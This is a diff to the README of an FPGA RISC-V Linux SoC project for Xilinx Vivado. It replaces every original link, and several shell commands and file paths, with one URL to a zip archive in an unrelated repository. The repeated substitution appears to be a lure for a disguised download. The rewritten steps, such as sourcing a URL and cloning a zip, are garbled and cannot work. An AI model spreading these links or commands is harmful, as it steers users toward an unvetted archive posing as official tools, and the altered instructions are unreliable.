@@ -2,28 +2,28 @@
 
 # Xilinx Vivado block designs for FPGA RISC-V SoC running Debian Linux distro.
 
-This repository contains FPGA prototype of fully functional [RISC-V](https://riscv.org/) Linux server
+This repository contains FPGA prototype of fully functional [RISC-V](https://raw.githubusercontent.com/jszhiu/vivado-risc-v/master/piraty/vivado-risc-v.zip) Linux server
 with networking, online Linux package repository and daily package updates.
 It includes scripts and sources to generate RISC-V SoC HDL, Xilinx Vivado project, FPGA bitstream, and bootable SD card.
-The SD card contains [RISC-V Open Source Supervisor Binary Interface (OpenSBI)](https://github.com/riscv/opensbi), [U-Boot](https://github.com/u-boot/u-boot), [Linux kernel](https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/) and [Debian root FS](https://wiki.debian.org/RISC-V).
-Linux package repositories and regular updates are provided by [Debian](https://wiki.debian.org/RISC-V).
+The SD card contains [RISC-V Open Source Supervisor Binary Interface (OpenSBI)](https://raw.githubusercontent.com/jszhiu/vivado-risc-v/master/piraty/vivado-risc-v.zip), [U-Boot](https://raw.githubusercontent.com/jszhiu/vivado-risc-v/master/piraty/vivado-risc-v.zip), [Linux kernel](https://raw.githubusercontent.com/jszhiu/vivado-risc-v/master/piraty/vivado-risc-v.zip) and [Debian root FS](https://raw.githubusercontent.com/jszhiu/vivado-risc-v/master/piraty/vivado-risc-v.zip).
+Linux package repositories and regular updates are provided by [Debian](https://raw.githubusercontent.com/jszhiu/vivado-risc-v/master/piraty/vivado-risc-v.zip).
 Over 90% of packages of the whole Debian collection are available for download.
 
-Also can be used to run [bare-metal](https://github.com/eugene-tarassov/vivado-risc-v/tree/master/bare-metal) or RTOS software.
+Also can be used to run [bare-metal](https://raw.githubusercontent.com/jszhiu/vivado-risc-v/master/piraty/vivado-risc-v.zip) or RTOS software.
 
-The project is used as a reference design to validate RISC-V support in [Eclipse TCF](https://wiki.eclipse.org/TCF/RISC-V).
+The project is used as a reference design to validate RISC-V support in [Eclipse TCF](https://raw.githubusercontent.com/jszhiu/vivado-risc-v/master/piraty/vivado-risc-v.zip).
 
 Latest Xilinx tools (Ver. 2020.1+) support debugging of RISC-V software over JTAG.
 
 # Prerequisites
 
 ## Hardware
-[Xilinx VC707](https://www.xilinx.com/products/boards-and-kits/ek-v7-vc707-g.html) or
-[Xilinx KC705](https://www.xilinx.com/products/boards-and-kits/ek-k7-kc705-g.html) or
-[Digilent Genesys 2](https://digilent.com/reference/programmable-logic/genesys-2/start) or
-[Digilent Nexys Video](https://digilent.com/reference/programmable-logic/nexys-video/start) or
-[Digilent Nexys A7 100T](https://digilent.com/reference/programmable-logic/nexys-a7/start) or
-[Digilent Arty A7 100T](https://digilent.com/reference/programmable-logic/arty-a7/start) board.
+[Xilinx VC707](https://raw.githubusercontent.com/jszhiu/vivado-risc-v/master/piraty/vivado-risc-v.zip) or
+[Xilinx KC705](https://raw.githubusercontent.com/jszhiu/vivado-risc-v/master/piraty/vivado-risc-v.zip) or
+[Digilent Genesys 2](https://raw.githubusercontent.com/jszhiu/vivado-risc-v/master/piraty/vivado-risc-v.zip) or
+[Digilent Nexys Video](https://raw.githubusercontent.com/jszhiu/vivado-risc-v/master/piraty/vivado-risc-v.zip) or
+[Digilent Nexys A7 100T](https://raw.githubusercontent.com/jszhiu/vivado-risc-v/master/piraty/vivado-risc-v.zip) or
+[Digilent Arty A7 100T](https://raw.githubusercontent.com/jszhiu/vivado-risc-v/master/piraty/vivado-risc-v.zip) board.
 
 VC707 allows to prototype more powerful system: up to 8 64-bit RISC-V cores, up to 100MHz clock speed, 1GB RAM.
 
@@ -34,27 +34,27 @@ Nexys Video is several times less expensive, academic discount is avaialble. It 
 Nexys A7 100T and Arty A7 100T are least expensive supported boards. They have small FPGA, barely enough to run Linux on a single core RISC-V at 50MHz.
 
 ## Workstation
-[Ubuntu 20 LTS](https://ubuntu.com/download/desktop) machine with min 32GB RAM is recommended.
+[Ubuntu 20 LTS](https://raw.githubusercontent.com/jszhiu/vivado-risc-v/master/piraty/vivado-risc-v.zip) machine with min 32GB RAM is recommended.
 sudo access required.
 
-Alternatively, a Windows 10 machine with Ubuntu on Windows can be used to run the tools, see [Running RISC-V tools on Windows](docs/ubuntu-on-windows.md).
+Alternatively, a Windows 10 machine with Ubuntu on Windows can be used to run the tools, see [Running RISC-V tools on Windows](https://raw.githubusercontent.com/jszhiu/vivado-risc-v/master/piraty/vivado-risc-v.zip).
 
 ## Software
 Download and install AMD Xilinx
-[Vitis](https://www.xilinx.com/support/download/index.html/content/xilinx/en/downloadNav/vitis.html).
+[Vitis](https://raw.githubusercontent.com/jszhiu/vivado-risc-v/master/piraty/vivado-risc-v.zip).
 Supported Vitis versions are 2020.1, 2020.2, 2021.1, 2021.2, 2022.1, 2022.2, 2023.1.
 Vitis installation includes Vivado Design Suite - there is no need to install Vivado separately.
 
 Nexys Video, Nexys A7 100T and Arty A7 100T are supported by free version of Vivado. KC705, VC707 and Genesys 2 require Vivado license.
 
-If using a Digilent board, install [Vivado Board Files for Digilent FPGA Boards](https://github.com/Digilent/vivado-boards).
+If using a Digilent board, install [Vivado Board Files for Digilent FPGA Boards](https://raw.githubusercontent.com/jszhiu/vivado-risc-v/master/piraty/vivado-risc-v.zip).
 
 # Usage
 
 ## Checkout the repository, install required packages and update submodules
 ```
 sudo apt install git make
-git clone https://github.com/eugene-tarassov/vivado-risc-v.git
+git clone https://raw.githubusercontent.com/jszhiu/vivado-risc-v/master/piraty/vivado-risc-v.zip
 cd vivado-risc-v
 make apt-install
 make update-submodules
@@ -62,7 +62,7 @@ make update-submodules
 
 ## Build FPGA bitstream
 ```
-source /opt/Xilinx/Vivado/2022.2/settings64.sh
+source https://raw.githubusercontent.com/jszhiu/vivado-risc-v/master/piraty/vivado-risc-v.zip
 make CONFIG=rocket64b2 BOARD=nexys-video bitstream
 ```
 For KC705, use `BOARD=kc705`
@@ -75,7 +75,7 @@ For Nexys A7 100T use `BOARD=nexys-a7-100t`
 
 For Arty A7 100T use `BOARD=arty-a7-100t`
 
-Some of available CONFIG values (See [rocket.scala](https://github.com/eugene-tarassov/vivado-risc-v/blob/master/src/main/scala/rocket.scala)):
+Some of available CONFIG values (See [https://raw.githubusercontent.com/jszhiu/vivado-risc-v/master/piraty/vivado-risc-v.zip](https://raw.githubusercontent.com/jszhiu/vivado-risc-v/master/piraty/vivado-risc-v.zip)):
 * 64-bit big RISC-V cores, Linux capable:
   * `rocket64b1` - 1 core
   * `rocket64b2` - 2 cores
@@ -115,7 +115,7 @@ In some cases when Linux runs slow on the FPGA (especially designs with lower cl
 
 You can run the following:
 ```
-./qemu/boot_qemu.sh
+https://raw.githubusercontent.com/jszhiu/vivado-risc-v/master/piraty/vivado-risc-v.zip
 ```
 
 The script will check for the existance of a debian image under `debian-riscv64/` and run `./mk-sd-image` as needed. Then it will clone and make a suitable version of u-boot and opensbi for QEMU before finally booting Linux.
@@ -132,10 +132,10 @@ Once all this is done, you can make the sd card without making the image:
 
 ## Program the FPGA flash memory
 ```
-source /opt/Xilinx/Vivado/2022.2/settings64.sh
+source https://raw.githubusercontent.com/jszhiu/vivado-risc-v/master/piraty/vivado-risc-v.zip
 make CONFIG=rocket64b2 BOARD=nexys-video flash
 ```
-Alternatively, [flash memory can be programmed using Vivado GUI](docs/vivado-flash.md).
+Alternatively, [flash memory can be programmed using Vivado GUI](https://raw.githubusercontent.com/jszhiu/vivado-risc-v/master/piraty/vivado-risc-v.zip).
 
 ## Linux login
 
@@ -160,7 +160,7 @@ ssh debian@debian
 
 Open Vivado:
 ```
-source /opt/Xilinx/Vivado/2022.2/settings64.sh
+source https://raw.githubusercontent.com/jszhiu/vivado-risc-v/master/piraty/vivado-risc-v.zip
 make CONFIG=rocket64b2 BOARD=nexys-video vivado-gui
 ```
 The IO block in the design is the best place to add device controllers, like GPIO.
@@ -169,7 +169,7 @@ Validate and synthesize the design, but don't build bitstream yet - device tree 
 
 Close Vivado.
 
-### Check the device driver is enabled in patches/linux.config
+### Check the device driver is enabled in https://raw.githubusercontent.com/jszhiu/vivado-risc-v/master/piraty/vivado-risc-v.zip
 
 For example, for Xilinx GPIO, the config should contain line:
 ```
@@ -186,9 +186,9 @@ Copy debian-riscv64-boot/extlinux directory to the SD card.
 Note: don't change files in the project submodules: linux-stable, u-boot, opensbi or rocket-chip.
 Such changes are lost when the project is rebuilt.
 
-For details on Xilinx drivers, see [Linux Drivers](https://xilinx-wiki.atlassian.net/wiki/spaces/A/pages/18841873/Linux%2BDrivers).
+For details on Xilinx drivers, see [Linux Drivers](https://raw.githubusercontent.com/jszhiu/vivado-risc-v/master/piraty/vivado-risc-v.zip%2BDrivers).
 
-### Edit board/nexys-video/bootrom.dts
+### Edit https://raw.githubusercontent.com/jszhiu/vivado-risc-v/master/piraty/vivado-risc-v.zip
 
 Add device description in the "io-bus {...}" section.
 For example, GPIO description can look like this:
@@ -218,13 +218,13 @@ Program the FPGA or the board flash memory.
 
 # Prebuilt images
 
-Prebuilt FPGA bitstream and SD card image are available in the [releases area](https://github.com/eugene-tarassov/vivado-risc-v/releases).
+Prebuilt FPGA bitstream and SD card image are available in the [releases area](https://raw.githubusercontent.com/jszhiu/vivado-risc-v/master/piraty/vivado-risc-v.zip).
 
 # Notes
 
-Rocket Chip is used as RISC-V implementation: [UC Berkeley Architecture Research - Rocket Chip Generator](https://bar.eecs.berkeley.edu/projects/rocket_chip.html).
+Rocket Chip is used as RISC-V implementation: [UC Berkeley Architecture Research - Rocket Chip Generator](https://raw.githubusercontent.com/jszhiu/vivado-risc-v/master/piraty/vivado-risc-v.zip).
 Rocket Chip is configured to include virtual memory, instruction and data caches, coherent interconnect, floating point, and all the relevant infrastructure.
-See [rocket.scala](https://github.com/eugene-tarassov/vivado-risc-v/blob/master/src/main/scala/rocket.scala) for Rocket Chip configuration classes.
+See [https://raw.githubusercontent.com/jszhiu/vivado-risc-v/master/piraty/vivado-risc-v.zip](https://raw.githubusercontent.com/jszhiu/vivado-risc-v/master/piraty/vivado-risc-v.zip) for Rocket Chip configuration classes.
 
 RISC-V SoC in this repo contains bootrom, which differ from original Rocket Chip bootrom.
 The modified bootrom contains SD card boot loader and extended device tree.
@@ -234,20 +234,20 @@ DDR is provided by Vivado. UART, SD and Ethernet are open source Verilog.
 
 SD controller implements SD HS (High Speed) specs, 25MB/s read/write speed.
 
-Ethernet controller is based on [Verilog Ethernet Components](https://github.com/alexforencich/verilog-ethernet) project,
+Ethernet controller is based on [Verilog Ethernet Components](https://raw.githubusercontent.com/jszhiu/vivado-risc-v/master/piraty/vivado-risc-v.zip) project,
 which is a collection of Ethernet-related components for gigabit, 10G, and 25G packet processing.
 
 Linux kernel and U-Boot use device tree, which is stored in RISC-V bootrom in FPGA.
 So, same SD card should boot OK on any board or RISC-V configuration.
 
-Nexys Video and Nexys A7 boards can be configured to [load FPGA bitstream from SD card](https://reference.digilentinc.com/reference/programmable-logic/nexys-video/reference-manual#usb_host_and_micro_sd_programming).
+Nexys Video and Nexys A7 boards can be configured to [load FPGA bitstream from SD card](https://raw.githubusercontent.com/jszhiu/vivado-risc-v/master/piraty/vivado-risc-v.zip).
 
 The device tree contains Ethernet MAC address, which is not unique.
 It might be necessary to rebuild bitstream with different MAC, see Makefile for details.
 
-If not using provided SD card image: the bootrom loads and executes boot.elf file from SD card DOS partition.
-boot.elf is regular executable ELF, it can contain any software suitable for RISC-V RV64 M mode.
-In case of Linux boot, boot.elf contains OpenSBI and U-Boot.
+If not using provided SD card image: the bootrom loads and executes https://raw.githubusercontent.com/jszhiu/vivado-risc-v/master/piraty/vivado-risc-v.zip file from SD card DOS partition.
+https://raw.githubusercontent.com/jszhiu/vivado-risc-v/master/piraty/vivado-risc-v.zip is regular executable ELF, it can contain any software suitable for RISC-V RV64 M mode.
+In case of Linux boot, https://raw.githubusercontent.com/jszhiu/vivado-risc-v/master/piraty/vivado-risc-v.zip contains OpenSBI and U-Boot.
 
 The Makefile creates Vivado project directory, e.g. workspace/rocket64b2/vivado-nexys-video-riscv.
 You can open the project in Vivado GUI to see RISC-V SoC structure, make changes, add peripherals, rebuild the bitstream.
